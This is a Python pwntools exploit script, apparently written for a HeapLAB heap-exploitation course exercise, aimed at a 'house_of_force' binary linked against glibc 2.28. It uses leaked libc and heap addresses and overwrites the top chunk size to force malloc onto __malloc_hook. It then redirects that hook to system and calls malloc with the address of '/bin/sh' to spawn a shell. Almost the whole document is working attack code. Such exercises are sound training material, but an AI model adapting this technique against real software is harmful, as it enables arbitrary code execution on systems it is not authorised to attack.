#!/usr/bin/env python3
# -*- coding: utf-8 -*-

'''
dev@ubuntu:~/Documents/heap-exploitation/HeapLAB/final$ file ./house_of_force
./house_of_force: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ../.glibc/glibc_2.28_no-tcache/ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=278a2aec8b352ea120c49321ed3254eb15ca8ef5, with debug_info, not stripped
dev@ubuntu:~/Documents/heap-exploitation/HeapLAB/final$ ldd ./house_of_force
	linux-vdso.so.1 (0x00007fffb6add000)
	libc.so.6 => ../.glibc/glibc_2.28_no-tcache/libc.so.6 (0x00007fe443aac000)
	../.glibc/glibc_2.28_no-tcache/ld.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007fe443e61000)
dev@ubuntu:~/Documents/heap-exploitation/HeapLAB/final$ checksec ./house_of_force
[*] '/home/dev/Documents/heap-exploitation/HeapLAB/final/house_of_force'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'../.glibc/glibc_2.28_no-tcache'
'''

from pwn import *

exe = context.binary = ELF('./house_of_force')
context.update(os='linux', arch='amd64', terminal=['tmux', 'splitw', '-v'])
libc = exe.libc


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

# wrapper around the malloc function
def malloc(sz, d):
    io.sendline("1")
    io.sendafter("size: ", f"{sz}")
    io.sendafter("data: ", d)
    io.recvuntil("> ")
    return

# grab the leaks
io = start()
io.timeout = 0.5
io.recvuntil("puts() @ ")
libc.address = (int(io.recvline(), 16) - libc.sym.puts)
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil("> ")
log.info("Leaked heap address {}".format(hex(heap)))
log.info("Leaked libc address {}".format(hex(libc.address)))

# create minimum sized heap allocation and fill it up with junk
# overwrite top chunk with p64(0xffffffffffffffff), setting up house of force primitive
malloc(24, b"A"*24 + p64(0xffffffffffffffff))

# calculate distance to target variable then call malloc to jump to that area in memory
distance = ( libc.sym.__malloc_hook - 32 ) - (heap + 32)
log.info("Found distance to __malloc_hook {}".format(distance))
malloc(distance, b"AAAA")

# overwrite __malloc_hook with path to system
malloc(24, p64(libc.sym.system))

# with __malloc_hook redirected. malloc will act like system
# call malloc with address of /bin/sh e.g. system("/bin/sh")
malloc(next(libc.search(b"/bin/sh")), "")

io.interactive()

